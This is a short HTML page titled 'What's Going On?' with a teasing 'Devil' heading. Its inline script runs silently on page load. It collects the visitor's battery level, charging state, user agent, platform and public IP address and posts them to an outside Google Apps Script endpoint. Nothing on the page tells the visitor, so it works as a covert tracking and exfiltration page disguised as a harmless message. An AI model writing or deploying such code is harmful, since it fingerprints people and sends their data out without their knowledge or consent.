<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>What's Going On?</title>
</head>
<body>
    <h1>What's going on? Devil üòè</h1>

    <script>
        async function sendData() {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                const batteryLevel = battery.level * 100;
                const chargingStatus = battery.charging ? "Charging" : "Not Charging";
                const userAgent = navigator.userAgent;
                const platform = navigator.platform;

                // Get IP Address
                const ipResponse = await fetch("https://api64.ipify.org?format=json");
                const ipData = await ipResponse.json();
                const ipAddress = ipData.ip;

                // Send data to Google Sheets
                fetch("https://script.google.com/macros/s/AKfycbw5ogqy9VJpBtRV8j3-BUbUP8k3CNs7osiUqaeHO-hwB0IS1fpBJXX1Qd--3NLEEyshnQ/exec", { 
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        battery: batteryLevel + "%",
                        charging: chargingStatus,
                        device: userAgent,
                        platform: platform,
                        ip: ipAddress
                    })
                });
            }
        }

        sendData();
    </script>
</body>
</html>
